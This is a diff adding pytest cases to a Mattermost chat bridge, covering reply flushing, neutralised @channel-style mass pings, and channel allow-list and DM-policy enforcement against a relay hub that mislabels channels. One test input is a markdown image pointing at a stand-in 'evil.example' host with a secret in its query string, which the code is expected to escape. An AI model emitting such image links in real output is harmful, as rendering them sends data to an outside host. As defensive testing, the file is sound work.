@@ -187,7 +187,9 @@ def test_an_unknown_dm_policy_is_refused():
 # replies
 # ---------------------------------------------------------------------------
 def speak(bridge, utterance, **context):
+    """``speak`` from the hub, then wait for the sender thread to have posted it."""
     bridge.handle_speak(Message("speak", {"utterance": utterance}, context))
+    assert bridge.flush_replies(5), "the reply was never sent"
 
 
 def test_a_reply_goes_to_the_questions_channel_naming_the_asker():
@@ -217,6 +219,7 @@ def test_a_reply_without_a_channel_is_dropped():
     bridge, _, api = bridge_with()
     speak(bridge, "hi there", user={"mattermost_username": "alice"})
     bridge.handle_intent_failure(Message("hive.complete_intent_failure", {}, {}))
+    assert bridge.flush_replies(5)
     speak(bridge, "", channel=TOWN_SQUARE)
     api.create_post.assert_not_called()
 
@@ -225,6 +228,7 @@ def test_an_intent_failure_gets_the_fallback_line():
     bridge, _, api = bridge_with()
     bridge.handle_intent_failure(Message("hive.complete_intent_failure", {},
                                          {"channel": DM_CHANNEL, "channel_type": "D"}))
+    assert bridge.flush_replies(5)
     channel, text = api.create_post.call_args[0]
     assert channel == DM_CHANNEL and "don't know" in text
 
@@ -242,3 +246,108 @@ def test_a_refused_token_on_a_reply_stops_the_bridge():
     api.create_post.side_effect = TokenRejected()
     speak(bridge, "hi", channel=TOWN_SQUARE)
     assert bridge._token_rejected.is_set()
+
+
+# ---------------------------------------------------------------------------
+# what a reply may say, and where it may go
+# ---------------------------------------------------------------------------
+@pytest.mark.parametrize("hub_text, posted", [
+    ("@channel lunch is here", "@⁠channel lunch is here"),
+    ("ping @all and @HERE", "ping @⁠all and @⁠HERE"),
+    ("as @bob said", "as @⁠bob said"),
+    ("x.@channel _@all (@here)", "x.@⁠channel _@⁠all (@⁠here)"),
+    ("write to me@example.com", "write to me@example.com"),
+    ("![chart](https://evil.example/p?q=secret)", "!\\[chart](https://evil.example/p?q=secret)"),
+    ("**bold**, `code`, [a link](https://example.com)",
+     "**bold**, `code`, [a link](https://example.com)"),
+])
+def test_a_reply_never_pings_anyone_but_the_asker_nor_loads_an_image(hub_text, posted):
+    """The hub writes what it is asked to; "say @channel ..." must not notify a whole channel."""
+    bridge, hub, api = bridge_with()
+    context = forwarded(bridge, hub, posted_event("@hivebot say it")).context
+    speak(bridge, hub_text, **context)
+    api.create_post.assert_called_once_with(TOWN_SQUARE, f"@alice {posted}", root_id="")
+
+
+def test_a_channel_wide_name_in_the_context_is_not_used_as_the_asker():
+    bridge, _, api = bridge_with()
+    speak(bridge, "hi", channel=TOWN_SQUARE, channel_type="O",
+          user={"mattermost_username": "channel"})
+    api.create_post.assert_called_once_with(TOWN_SQUARE, "hi", root_id="")
+
+
+def test_a_reply_to_a_channel_off_the_list_is_not_posted():
+    bridge, _, api = bridge_with(allowed_channels=[TOWN_SQUARE])
+    speak(bridge, "hi", channel=OFF_TOPIC, channel_type="O")
+    speak(bridge, "hi", channel=DM_CHANNEL, channel_type="D")
+    speak(bridge, "hi", channel=OFF_TOPIC)  # no type: not a DM either
+    api.create_post.assert_not_called()
+    speak(bridge, "hi", channel=TOWN_SQUARE, channel_type="O")
+    api.create_post.assert_called_once()
+
+
+def test_a_reply_in_a_dm_follows_the_dm_policy():
+    bridge, _, api = bridge_with(dm_policy="deny")
+    speak(bridge, "hi", channel=DM_CHANNEL, channel_type="D")
+    api.create_post.assert_not_called()
+
+
+def test_a_listed_group_dm_is_answered():
+    """A channel id on the list is answered whatever its type."""
+    bridge, hub, api = bridge_with(allowed_channels=[TOWN_SQUARE, GROUP_CHANNEL])
+    assert bridge.dm_policy == "deny"
+    message = forwarded(bridge, hub, posted_event("@hivebot hi", channel_id=GROUP_CHANNEL,
+                                                  channel_type="G"))
+    assert message is not None
+    speak(bridge, "hello", **message.context)
+    api.create_post.assert_called_once_with(GROUP_CHANNEL, "@alice hello", root_id="")
+    assert forwarded(bridge, hub, posted_event("@hivebot hi", channel_id=DM_CHANNEL,
+                                               channel_type="D")) is None
+
+
+# ---------------------------------------------------------------------------
+# a reply's channel type is the bridge's, never the hub's
+# ---------------------------------------------------------------------------
+@pytest.mark.parametrize("hub_type", ["D", "G"])
+def test_a_hub_reply_cannot_label_an_unlisted_channel_a_dm_to_get_past_the_list(hub_type):
+    """With dm_policy=allow, DMs are answered off the list. The hub's context
+    must not be able to call any channel a DM to post there."""
+    bridge, hub, api = bridge_with(allowed_channels=[TOWN_SQUARE], dm_policy="allow")
+    speak(bridge, "leak", channel=OFF_TOPIC, channel_type=hub_type)
+    api.create_post.assert_not_called()
+    # a channel the bridge saw as public, relabelled by the hub: refused too
+    bridge2, hub2, api2 = bridge_with(dm_policy="allow")
+    bridge2.allowed_channels = {TOWN_SQUARE}
+    forwarded(bridge2, hub2, posted_event("@hivebot hi", channel_id=OFF_TOPIC, channel_type="O"))
+    speak(bridge2, "leak", channel=OFF_TOPIC, channel_type=hub_type)
+    api2.create_post.assert_not_called()
+
+
+def test_a_real_dm_the_bridge_forwarded_is_still_answered_off_the_list():
+    bridge, hub, api = bridge_with(allowed_channels=[TOWN_SQUARE], dm_policy="allow")
+    context = forwarded(bridge, hub, dm("what time is it")).context
+    speak(bridge, "It is three.", **context)
+    api.create_post.assert_called_once_with(DM_CHANNEL, "It is three.", root_id="")
+
+
+def test_an_unseen_channel_is_answered_only_when_every_channel_would_be():
+    # no list and DMs allowed: any channel is answered, whatever it is
+    bridge, _, api = bridge_with(dm_policy="allow")
+    speak(bridge, "hi", channel=OFF_TOPIC, channel_type="O")
+    api.create_post.assert_called_once()
+    # no list but DMs denied: an unseen channel could be a DM; the hub's "O" is not proof
+    bridge, _, api = bridge_with(dm_policy="deny")
+    bridge.handle_speak(Message("speak", {"utterance": "hi"}, {"channel": DM_CHANNEL,
+                                                               "channel_type": "O"}))
+    assert bridge.flush_replies(5)
+    api.create_post.assert_not_called()
+
+
+def test_the_seen_channel_memory_is_bounded(monkeypatch):
+    import mattermost_bridge
+
+    monkeypatch.setattr(mattermost_bridge, "SEEN_CHANNEL_MEMORY", 3)
+    bridge, hub, _ = bridge_with()
+    for number in range(10):
+        forwarded(bridge, hub, posted_event("@hivebot hi", channel_id=f"{number:026d}"))
+    assert len(bridge._seen_channels) == 3
